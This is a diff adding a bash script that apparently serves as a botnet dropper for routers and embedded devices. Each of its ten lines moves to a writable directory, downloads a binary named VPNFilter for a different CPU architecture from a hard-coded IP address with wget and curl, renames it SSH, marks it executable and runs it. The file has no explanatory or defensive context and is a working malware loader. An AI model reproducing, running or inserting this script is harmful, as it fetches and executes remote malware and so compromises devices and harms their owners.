@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.x86; curl -O http://185.11.146.68/bins/VPNFilter.x86;cat VPNFilter.x86 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.mips; curl -O http://185.11.146.68/bins/VPNFilter.mips;cat VPNFilter.mips >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.mpsl; curl -O http://185.11.146.68/bins/VPNFilter.mpsl;cat VPNFilter.mpsl >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.arm4; curl -O http://185.11.146.68/bins/VPNFilter.arm4;cat VPNFilter.arm4 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.arm5; curl -O http://185.11.146.68/bins/VPNFilter.arm5;cat VPNFilter.arm5 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.arm6; curl -O http://185.11.146.68/bins/VPNFilter.arm6;cat VPNFilter.arm6 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.arm7; curl -O http://185.11.146.68/bins/VPNFilter.arm7;cat VPNFilter.arm7 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.ppc; curl -O http://185.11.146.68/bins/VPNFilter.ppc;cat VPNFilter.ppc >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.m68k; curl -O http://185.11.146.68/bins/VPNFilter.m68k;cat VPNFilter.m68k >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.11.146.68/bins/VPNFilter.sh4; curl -O http://185.11.146.68/bins/VPNFilter.sh4;cat VPNFilter.sh4 >SSH;chmod +x *;./SSH
